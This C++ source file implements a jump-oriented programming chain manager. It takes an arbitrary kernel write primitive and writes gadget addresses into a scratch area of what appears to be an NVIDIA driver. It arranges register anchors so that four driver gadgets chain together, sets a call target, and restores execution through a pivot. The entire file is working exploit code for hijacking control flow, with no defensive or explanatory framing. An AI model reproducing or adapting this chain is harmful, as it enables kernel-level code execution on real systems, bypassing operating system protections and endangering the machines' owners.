#include "jopmanager.h"

JOPManager::JOPManager()
    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0), scratchBase(0), rax(0), rsi(0), rdx(0)
{}

void JOPManager::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn) {
    writeFn = fn;
}

void JOPManager::SetNvidiaBase(UINT64 base) {
    nvidiaBase = base;
}

void JOPManager::SetScratchBase(UINT64 base) {
    scratchBase = base;
    DbgLog("[JOPManager] scratchBase=0x%llX\n", scratchBase);
}

void JOPManager::AddSlot(const char* name, UINT64 scratchOff, UINT64 value) {
    // 1.7MB free in .data — cap at 1.6MB to stay safe
    if (scratchOff + sizeof(UINT64) > 0x19A000) {
        DbgLog("[JOPManager] OVERFLOW: '%s' at scratch+0x%llX\n", name, scratchOff);
        return;
    }
    slots.push_back({ name, scratchBase + scratchOff, value });
}

UINT64 JOPManager::Alloc(const char* name, UINT64 value) {
    UINT64 off = allocPtr;
    AddSlot(name, off, value);
    allocPtr += sizeof(UINT64);
    return scratchBase + off;
}

void JOPManager::Build(UINT64 g1Off, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
    slots.clear();
    allocPtr = SCRATCH_ALLOC_START;

    if (!scratchBase) {
        DbgLog("[JOPManager::Build] FAIL: scratchBase not set\n");
        return;
    }

    UINT64 g2 = nvidiaBase + g2Off;
    UINT64 g3 = nvidiaBase + g3Off;
    UINT64 g4 = nvidiaBase + g4Off;

    // rsi slots — must be exactly 0xA5 apart
    AddSlot("rsi_bck [rsi-0x39]", SCRATCH_RSI_BCK, g4);
    AddSlot("rsi_fwd [rsi+0x66]", SCRATCH_RSI_FWD, g3);
    rsi = scratchBase + SCRATCH_RSI_FWD - 0x66;
    DbgLog("[JOP] rsi=0x%llX  [rsi+0x66]=0x%llX  [rsi-0x39]=0x%llX\n",
        rsi, rsi + 0x66, rsi - 0x39);

    // rax slot
    AddSlot("rax_slot [rax-0x35C17]", SCRATCH_RAX, g2);
    rax = scratchBase + SCRATCH_RAX + 0x35C17;
    DbgLog("[JOP] rax=0x%llX  [rax-0x35C17]=0x%llX\n", rax, rax - 0x35C17);

    // rdx anchor: gadget3 reads new_rax from [rdx+0x1B0]
    // We put the new_rax value at SCRATCH_NEW_RAX, so:
    //   rdx + 0x1B0 = scratchBase + SCRATCH_NEW_RAX
    //   rdx = scratchBase + SCRATCH_NEW_RAX - 0x1B0
    rdx = scratchBase + SCRATCH_NEW_RAX - 0x1B0;
    UINT64 newRax = scratchBase + SCRATCH_NEW_RAX;
    AddSlot("rdx_1B0 [rdx+0x1B0]", SCRATCH_NEW_RAX, newRax);
    DbgLog("[JOP] rdx=0x%llX  [rdx+0x1B0]=0x%llX (newRax)\n", rdx, newRax);
    DbgLog("[JOP] gadget3 side-writes: [rdx+0x3E0]=0x%llX  [rdx+0x3E8]=0x%llX (scratch, harmless)\n",
        rdx + 0x3E0, rdx + 0x3E8);

    // gadget3 continuation: [newRax+0x1C0] -> g4
    AddSlot("g3_cont [newRax+0x1C0]", SCRATCH_G3_CONT, g4);

    // gadget4 continuation: [newRax+0x28] -> rop pivot
    AddSlot("g4_cont [newRax+0x28]", SCRATCH_G4_CONT, 0);

    DbgLog("[JOP] Build complete - %zu slots, scratch base=0x%llX\n",
        slots.size(), scratchBase);
}

void JOPManager::SetCallTarget(UINT64 addr) {
    if (!scratchBase) { DbgLog("[JOP::SetCallTarget] FAIL: scratchBase not set\n"); return; }
    if (!writeFn)     { DbgLog("[JOP::SetCallTarget] FAIL: no write primitive\n"); return; }
    UINT64 slot = scratchBase + SCRATCH_RAX;
    DbgLog("[JOP::SetCallTarget] [rax-0x35C17]=0x%llX -> 0x%llX\n", slot, addr);
    writeFn(slot, addr);
    for (auto& s : slots) { if (s.addr == slot) { s.value = addr; return; } }
}

void JOPManager::SetRestoreRip(UINT64 addr) {
    if (!scratchBase) { DbgLog("[JOP::SetRestoreRip] FAIL: scratchBase not set\n"); return; }
    if (!writeFn)     { DbgLog("[JOP::SetRestoreRip] FAIL: no write primitive\n"); return; }
    UINT64 slot = scratchBase + SCRATCH_G4_CONT;
    DbgLog("[JOP::SetRestoreRip] [newRax+0x28]=0x%llX -> 0x%llX\n", slot, addr);
    writeFn(slot, addr);
    for (auto& s : slots) { if (s.addr == slot) { s.value = addr; return; } }
}

void JOPManager::Commit() {
    if (!scratchBase) { DbgLog("[JOP::Commit] FAIL: scratchBase not set\n"); return; }
    if (!writeFn)     { DbgLog("[JOP::Commit] FAIL: no write primitive\n"); return; }
    for (const auto& s : slots) {
        DbgLog("[JOP::Commit] %-35s  addr=0x%llX  val=0x%llX\n",
            s.name, s.addr, s.value);
        writeFn(s.addr, s.value);
    }
    DbgLog("[JOP::Commit] Done — %zu slots written\n", slots.size());
}

void JOPManager::PrintLayout() const {
    DbgLog("[JOP Layout] scratchBase=0x%llX  (%zu slots)\n", scratchBase, slots.size());
    for (const auto& s : slots)
        DbgLog("  %-35s  0x%llX  =  0x%llX\n", s.name, s.addr, s.value);
    DbgLog("  rax = 0x%llX\n  rsi = 0x%llX\n  rdx = 0x%llX\n", rax, rsi, rdx);
}
